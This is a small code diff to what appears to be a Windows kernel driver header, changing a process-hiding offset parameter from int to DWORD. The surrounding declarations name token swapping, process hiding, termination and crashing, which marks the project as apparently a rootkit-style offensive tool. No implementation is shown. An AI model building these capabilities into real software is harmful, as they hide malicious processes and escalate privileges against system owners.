@@ -132,7 +132,7 @@ struct elevateProcArgs {
 
 struct hideProcArgs {
     DWORD pid;
-    int offset;
+    DWORD offset;
 };
 
 
@@ -156,7 +156,7 @@ NTSTATUS procTokenSwap(DWORD, DWORD, int);
 
 NTSTATUS TermProcess(ULONG_PTR);
 NTSTATUS crashProcess(ULONG_PTR);
-NTSTATUS procHiding(DWORD, int);
+NTSTATUS procHiding(DWORD, DWORD);
 
 #ifndef SystemModuleInformation
 #define SystemModuleInformation 0xB
